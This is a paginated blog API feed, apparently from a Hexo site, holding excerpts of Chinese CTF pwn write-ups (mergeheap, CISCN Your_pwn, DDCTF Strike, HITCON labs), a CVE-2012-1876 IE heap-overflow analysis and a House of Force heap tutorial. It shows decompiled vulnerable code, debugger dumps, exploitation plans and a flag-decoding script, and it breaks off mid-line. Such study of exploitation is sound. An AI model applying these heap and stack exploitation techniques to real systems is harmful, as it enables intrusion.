{"total":11,"pageSize":10,"pageCount":2,"data":[{"title":"2019护网杯_mergeheap","slug":"2019护网杯-mergeheap","date":"2019-09-10T12:24:26.000Z","updated":"2019-09-21T08:32:01.591Z","comments":true,"path":"api/articles/2019护网杯-mergeheap.json","excerpt":"<h1 id=\"mergeheap\"><a href=\"#mergeheap\" class=\"headerlink\" title=\"mergeheap\"></a>mergeheap</h1><h2 id=\"审计与分析\"><a href=\"#审计与分析\" class=\"headerlink\" title=\"审计与分析\"></a>审计与分析</h2><h3 id=\"add\"><a href=\"#add\" class=\"headerlink\" title=\"add\"></a>add</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">add</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> i; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v2; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">14</span> &amp;&amp; ptrs[i]; ++i )</span><br><span class=\"line\">    ;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( i &gt; <span class=\"number\">14</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"full\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"len:\"</span>);</span><br><span class=\"line\">  v2 = read_num();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v2 &lt; <span class=\"number\">0</span> || v2 &gt; <span class=\"number\">1024</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"invalid\"</span>);</span><br><span class=\"line\">  ptrs[i] = <span class=\"built_in\">malloc</span>(v2);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"content:\"</span>);</span><br><span class=\"line\">  read_until_nil(ptrs[i], v2);</span><br><span class=\"line\">  dword_202060[i] = v2;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"Done\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>最多14个堆块，大小在0到0x400之间，将每个堆块指针和堆块size存储在bss段上的全局数组处。</p>\n<h3 id=\"show\"><a href=\"#show\" class=\"headerlink\" title=\"show\"></a>show</h3><p>会输出对应堆块指针中的值。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">show</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> result; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v1; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"idx:\"</span>);</span><br><span class=\"line\">  v1 = read_num();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 &gt;= <span class=\"number\">0</span> &amp;&amp; v1 &lt;= <span class=\"number\">14</span> &amp;&amp; ptrs[v1] )</span><br><span class=\"line\">    result = <span class=\"built_in\">puts</span>((<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *)ptrs[v1]);</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    result = <span class=\"built_in\">puts</span>(<span class=\"string\">\"invalid\"</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","keywords":null,"cover":null,"content":null,"text":"mergeheap审计与分析add1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>int add()<br>&#123","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":8,"path":"api/tags/pwn.json"}]},{"title":"CVE-2012-1876调试分析","slug":"CVE-2012-1876调试分析","date":"2019-07-10T12:19:25.000Z","updated":"2019-09-21T08:39:37.449Z","comments":true,"path":"api/articles/CVE-2012-1876调试分析.json","excerpt":"<h2 id=\"CVE-2012-1876\"><a href=\"#CVE-2012-1876\" class=\"headerlink\" title=\"CVE-2012-1876\"></a>CVE-2012-1876</h2><h3 id=\"1-漏洞简介\"><a href=\"#1-漏洞简介\" class=\"headerlink\" title=\"1. 漏洞简介\"></a>1. 漏洞简介</h3><p>一个IE漏洞，成功利用可RCE，问题在mshtml.dll模块的CTableLayout::CalculateMinMax函数中，程序在执行时会以HTML代码中\\元素的span属性作为循环控制次数向堆空间写入数据，如果此span值设置的不当，那么就会触发堆溢出问题。</p>\n<p>其中mshtml.dll模块是IE中的重要组件，用来解析HTML和CSS。（微软官方说明<a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/aa741312(v=vs.85)）\" target=\"_blank\" rel=\"noopener\">https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/aa741312(v=vs.85)）</a></p>\n<p>系统：Win7 Pro x86</p>\n<p>版本：IE8.0.7601.17514</p>","keywords":null,"cover":"http://4.bp.blogspot.com/-xM3evabUguA/TlulZu6npaI/AAAAAAAAAB0/afhXWHrFcd0/s1600/spray_diagram.png","content":null,"text":"CVE-2012-18761. 漏洞简介一个IE漏洞，成功利用可RCE，问题在mshtml.dll模块的CTableLayout::CalculateMinMax函数中，程序在执行时会以HTML代码中\\元素的span属性作为循环控制次数向堆空间写入数据，如果此span值设置的不当","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":8,"path":"api/tags/pwn.json"}]},{"title":"2019CISCN_PWN(一)","slug":"2019CISCN-PWN-一","date":"2019-04-28T02:31:02.000Z","updated":"2019-09-21T08:32:43.789Z","comments":true,"path":"api/articles/2019CISCN-PWN-一.json","excerpt":"<h1 id=\"2019CISCN-PWN题解\"><a href=\"#2019CISCN-PWN题解\" class=\"headerlink\" title=\"2019CISCN_PWN题解\"></a>2019CISCN_PWN题解</h1><h2 id=\"0x00-Your-pwn\"><a href=\"#0x00-Your-pwn\" class=\"headerlink\" title=\"0x00  Your_pwn\"></a>0x00  Your_pwn</h2><h3 id=\"防护\"><a href=\"#防护\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/2019_guosai/your_pwn$ checksec pwn</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/2019_guosai/your_pwn/pwn&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>\n<p>RELRO没全开，其余全开</p>\n<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>首先会向栈上写0x100，然后循环调用sub_B35函数。函数要求输入一个index，然后leak出从rbp - 0x150起的v4[index]的值，然后将值覆盖为要修改的值，也就是实现栈上的任意读写。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_<span class=\"function\">BOOL8 <span class=\"title\">sub_B35</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> index; <span class=\"comment\">// [rsp+4h] [rbp-15Ch]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v2; <span class=\"comment\">// [rsp+8h] [rbp-158h]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> i; <span class=\"comment\">// [rsp+Ch] [rbp-154h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v4[<span class=\"number\">64</span>]; <span class=\"comment\">// [rsp+10h] [rbp-150h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> s; <span class=\"comment\">// [rsp+50h] [rbp-110h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v6; <span class=\"comment\">// [rsp+158h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v6 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(&amp;s, <span class=\"number\">0</span>, <span class=\"number\">0x100</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(v4, <span class=\"number\">0</span>, <span class=\"number\">0x28</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">40</span>; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"input index\"</span>);</span><br><span class=\"line\">    __isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;index);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"now value(hex) %x\\n\"</span>, (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)v4[index]);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"input new value\"</span>);</span><br><span class=\"line\">    __isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;v2);</span><br><span class=\"line\">    v4[index] = v2;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"do you want continue(yes/no)? \"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;s, <span class=\"number\">0x100</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">strncmp</span>(&amp;s, <span class=\"string\">\"yes\"</span>, <span class=\"number\">3u</span>LL) == <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>先leak出libc地址</p>\n<p>libc在rsp+0x280处，一开始输入的name在rsp + 0x170处，</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  dereference $rsp</span><br><span class=\"line\">0x00007fffffffdc90│+0x0140: 0x0000000000000000</span><br><span class=\"line\">0x00007fffffffdc98│+0x0148: 0x0000000000000000</span><br><span class=\"line\">0x00007fffffffdca0│+0x0150: 0x0000000000000000</span><br><span class=\"line\">0x00007fffffffdca8│+0x0158: 0x82e23df75b4cba00</span><br><span class=\"line\">0x00007fffffffdcb0│+0x0160: 0x00007fffffffddd0  →  0x0000555555554ca0  →   push r15\t ← $rbp</span><br><span class=\"line\">0x00007fffffffdcb8│+0x0168: 0x0000555555554b11  →   test eax, eax</span><br><span class=\"line\">0x00007fffffffdcc0│+0x0170: 0x0000000a6377696c (&quot;liwc&quot;?)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">gef➤  dereference $rsp</span><br><span class=\"line\">0x00007fffffffddd0│+0x0280: 0x0000555555554ca0  →   push r15</span><br><span class=\"line\">0x00007fffffffddd8│+0x0288: 0x00007ffff7a2d830  →  &lt;__libc_start_main+240&gt; mov edi, eax</span><br></pre></td></tr></table></figure>\n<p>可以看到，在libc地址为0x7f766337c830时，leak出的值为ffffffc8，所以只需要删除ffffff即可。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x00007fffbaeeb878│+0x0288: 0x00007f765337c830  →  &lt;__libc_start_main+240&gt; mov edi, eax</span><br><span class=\"line\">[&apos;30&apos;, &apos;ffffffc8&apos;, &apos;37&apos;, &apos;53&apos;, &apos;76&apos;, &apos;7f&apos;, &apos;0&apos;, &apos;0&apos;]</span><br></pre></td></tr></table></figure>\n<p>最后直接把retn地址覆盖为one_gadget即可，直接绕过了canary，exp如下<br>","keywords":null,"cover":null,"content":null,"text":"2019CISCN_PWN题解0x00  Your_pwn防护1<br>2<br>3<br>4<br>5<br>6<br>7<br>liwc@ubuntu:~/pwn/2019_guosai/your_pwn$ checksec pwn<br>[*] &apos;/home/li","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":8,"path":"api/tags/pwn.json"}]},{"title":"Top Chunk利用","slug":"Top Chunk利用","date":"2019-04-21T02:58:07.000Z","updated":"2019-09-21T08:33:55.366Z","comments":true,"path":"api/articles/Top Chunk利用.json","excerpt":"<p>本文讲一下近期学习的两种围绕Top Chunk做文章的堆利用方法：House of Force和直接修改main_arena中的top指针。</p>\n<h2 id=\"House-of-force（Top-chunk劫持）\"><a href=\"#House-of-force（Top-chunk劫持）\" class=\"headerlink\" title=\"House of force（Top chunk劫持）\"></a>House of force（Top chunk劫持）</h2><h3 id=\"top-chunk的分割机制与利用点\"><a href=\"#top-chunk的分割机制与利用点\" class=\"headerlink\" title=\"top chunk的分割机制与利用点\"></a>top chunk的分割机制与利用点</h3><p>众所周知，top chunk的作用是作为后备堆空间，在各bin中没有chunk可提供时，分割出一个chunk提供给用户。那么这个分割过程是怎样的呢？我们来看一份源码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">victim = av-&gt;top;</span><br><span class=\"line\">size   = chunksize(victim);</span><br><span class=\"line\"><span class=\"keyword\">if</span> ((<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>) (size) &gt;= (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>) (nb + MINSIZE)) <span class=\"comment\">//检查请求size是否可以分配</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    remainder_size = size - nb; <span class=\"comment\">// 分配后size，此处nb为有符号数</span></span><br><span class=\"line\">    remainder      = chunk_at_offset(victim, nb); <span class=\"comment\">// 分配后指针</span></span><br><span class=\"line\">    av-&gt;top        = remainder; <span class=\"comment\">// top = 分配后的指针</span></span><br><span class=\"line\">    set_head(victim, nb | PREV_INUSE | <span class=\"comment\">// 设置PREV_INUSE和NON_MAIN_ARENA</span></span><br><span class=\"line\">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class=\"number\">0</span>)); </span><br><span class=\"line\">    set_head(remainder, remainder_size | PREV_INUSE); <span class=\"comment\">//设置top</span></span><br><span class=\"line\"></span><br><span class=\"line\">    check_malloced_chunk(av, victim, nb);</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p = chunk2mem(victim);</span><br><span class=\"line\">    alloc_perturb(p, bytes);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>首先是libc会检查用户申请的大小，top chunk是否能给的起，如果给得起，就由top chunk的head处，以用户申请大小所匹配的chunk大小为偏移量，将top chunk的位置推到新的位置，而原来的top chunk head处就作为新的堆块被分配给用户了</p>\n<p>试想，如果我们能控制top chunk在这个过程中推到任意位置，也就是说，如果我们能控制用户申请的大小为任意值，我们就能将top chunk劫持到任意内存地址，然后就可以控制目标内存。</p>\n<p>一般来说，pwn中劫持控制流常常取malloc_hook, got表等指针，与堆空间中的top chunk相聚甚远，远到所需要申请的size必定超过top chunk现有的大小，无法控制if条件的检查。</p>\n<p>但是，我们看到if条件检查时size被强制转换为unsigned long，所以如果我们将size溢出覆盖为0xffffffff（-1），那么我们可以任意申请。此外，虽然此处的检查中，用户申请的大小也被当作无符号整数对待，但是在后面推top chunk的时候是以int对待的，所以可以劫持到低地址，加负数。</p>\n<h3 id=\"利用条件\"><a href=\"#利用条件\" class=\"headerlink\" title=\"利用条件\"></a>利用条件</h3><ul>\n<li>用户可以修改top chunk的size字段</li>\n<li>用户可以申请任意大小的堆内存（包括负数）</li>\n</ul>","keywords":null,"cover":null,"content":null,"text":"本文讲一下近期学习的两种围绕Top Chunk做文章的堆利用方法：House of Force和直接修改main_arena中的top指针。House of force（Top chunk劫持）top chunk的分割机制与利用点众所周知，top chunk的作用是作为后备堆空间","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":8,"path":"api/tags/pwn.json"}]},{"title":"DDCTF2019-writeup","slug":"DDCTF2019-writeup","date":"2019-04-18T11:41:06.000Z","updated":"2019-09-21T08:33:04.441Z","comments":true,"path":"api/articles/DDCTF2019-writeup.json","excerpt":"<p>本次DDCTF2019抱着玩一玩的心态参与了一下，事先不知道Pwn的题目这么少，RE的题目也不算多（主要RE的难题我不会做，简单题又比较水），所以就一开始做了两天，后续没有再尝试，最后排名100多位。下面简单总结一下Pwn和RE几道题的writeup。</p>\n<h1 id=\"Pwn\"><a href=\"#Pwn\" class=\"headerlink\" title=\"Pwn\"></a>Pwn</h1><p>pwn只有一道题目</p>\n<h2 id=\"Strike\"><a href=\"#Strike\" class=\"headerlink\" title=\"Strike\"></a>Strike</h2><p>该题目提供了libc，防护如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/DDCTF2019$ checksec xpwn </span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/DDCTF2019/xpwn&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<p>未开启canary和PIE，只开启了NX，且为32位，有栈利用的可能。</p>\n<p>简单运行程序发现程序首先要求输入用户名，然后在打印用户名的时候会出现一些不可见字符，这里可能存在信息泄漏漏洞。之后要求输入密码的长度，再输入密码。用IDA简单查看下：</p>\n<p>在向栈上写name时，由于写完就用格式化字符串的%s格式输出，所以只要不输入\\x00，就可以随意leak出栈上的数据。</p>","keywords":null,"cover":null,"content":null,"text":"本次DDCTF2019抱着玩一玩的心态参与了一下，事先不知道Pwn的题目这么少，RE的题目也不算多（主要RE的难题我不会做，简单题又比较水），所以就一开始做了两天，后续没有再尝试，最后排名100多位。下面简单总结一下Pwn和RE几道题的writeup。Pwnpwn只有一道题目St","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":8,"path":"api/tags/pwn.json"},{"name":"RE","slug":"RE","count":2,"path":"api/tags/RE.json"}]},{"title":"HITCON_training题解(二)","slug":"HITCON-training-2","date":"2019-04-10T06:47:59.000Z","updated":"2019-09-21T08:33:50.169Z","comments":true,"path":"api/articles/HITCON-training-2.json","excerpt":"<h2 id=\"Lab10——hacknote\"><a href=\"#Lab10——hacknote\" class=\"headerlink\" title=\"Lab10——hacknote\"></a>Lab10——hacknote</h2><h3 id=\"防护\"><a href=\"#防护\" class=\"headerlink\" title=\"防护\"></a>防护</h3><p>可以看到本题开启了canary和nx，这时想在栈上进行利用就相当困难了。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab10$ checksec hacknote</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab10/hacknote&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>本题是一道典型的堆菜单题，共有4个选项</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. Add note          </span><br><span class=\"line\">2. Delete note       </span><br><span class=\"line\">3. Print note        </span><br><span class=\"line\">4. Exit</span><br></pre></td></tr></table></figure>","keywords":null,"cover":null,"content":null,"text":"Lab10——hacknote防护可以看到本题开启了canary和nx，这时想在栈上进行利用就相当困难了。1<br>2<br>3<br>4<br>5<br>6<br>7<br>liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab10$ checkse","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":8,"path":"api/tags/pwn.json"}]},{"title":"HITCON_training题解(一)","slug":"HITCON-training-1","date":"2019-04-10T06:47:42.000Z","updated":"2019-09-21T08:33:39.313Z","comments":true,"path":"api/articles/HITCON-training-1.json","excerpt":"<h2 id=\"Lab1——sysmagic\"><a href=\"#Lab1——sysmagic\" class=\"headerlink\" title=\"Lab1——sysmagic\"></a>Lab1——sysmagic</h2><h3 id=\"防护\"><a href=\"#防护\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab1$ checksec sysmagic</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab1/sysmagic&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>程序要求输入一个magic，然后就直接退出。用IDA看一下：</p>\n<p>在函数get_flag中直接要求读入到栈上v2处（ebp+0x7c），如果v2和随机数buf相等，则直接打印出栈上的flag。buf在(ebp+0x80处)。不过貌似没有较好的溢出方法，不过这实际上是一道逆向题，通过逆向可以直接找到答案。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fd = open(<span class=\"string\">\"/dev/urandom\"</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\"> read(fd, &amp;buf, <span class=\"number\">4u</span>);</span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">\"Give me maigc :\"</span>);</span><br><span class=\"line\"> __isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;v2);</span><br><span class=\"line\"> <span class=\"keyword\">if</span> ( buf == v2 )</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">   <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">0x30</span>; ++i )</span><br><span class=\"line\">     <span class=\"built_in\">putchar</span>((<span class=\"keyword\">char</span>)(*(&amp;v5 + i) ^ *((_BYTE *)&amp;v54 + i)));</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>观察汇编代码，还原两个字符串，然后按位异或即可找到flag。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">str1 = &apos;\\x44\\x6f\\x5f\\x79\\x6f\\x75\\x5f\\x6b&apos;</span><br><span class=\"line\">str1 += &apos;\\x6e\\x6f\\x77\\x5f\\x77\\x68\\x79\\x5f&apos;</span><br><span class=\"line\">str1 += &apos;\\x6d\\x79\\x5f\\x74\\x65\\x61\\x6d\\x6d&apos;</span><br><span class=\"line\">str1 += &apos;\\x61\\x74\\x65\\x5f\\x4f\\x72\\x61\\x6e&apos;</span><br><span class=\"line\">str1 += &apos;\\x67\\x65\\x5f\\x69\\x73\\x5f\\x73\\x6f&apos;</span><br><span class=\"line\">str1 += &apos;\\x5f\\x61\\x6e\\x67\\x72\\x79\\x3f\\x3f\\x3f&apos;</span><br><span class=\"line\">str2 = &apos;\\x07\\x3b\\x19\\x02\\x0b\\x10\\x3d\\x1e&apos;</span><br><span class=\"line\">str2 += &apos;\\x09\\x08\\x12\\x2d\\x28\\x59\\x0a\\x00\\x1e&apos;</span><br><span class=\"line\">str2 += &apos;\\x16\\x00\\x04\\x55\\x16\\x08\\x1f\\x07\\x01&apos;</span><br><span class=\"line\">str2 += &apos;\\x09\\x00\\x7e\\x1c\\x3e\\x0a\\x1e\\x0b\\x6b&apos;</span><br><span class=\"line\">str2 += &apos;\\x04\\x42\\x3c\\x2c\\x5b\\x31\\x55\\x02\\x1e&apos;</span><br><span class=\"line\">str2 += &apos;\\x21\\x10\\x4c\\x1e\\x42&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">flag = &quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">for i in range(len(str1)):</span><br><span class=\"line\">\tflag += chr(ord(str1[i]) ^ ord(str2[i]))</span><br><span class=\"line\"></span><br><span class=\"line\">print flag</span><br><span class=\"line\"></span><br><span class=\"line\">CTF&#123;debugger_1s_so_p0werful_1n_dyn4m1c_4n4lySis!&#125;</span><br><span 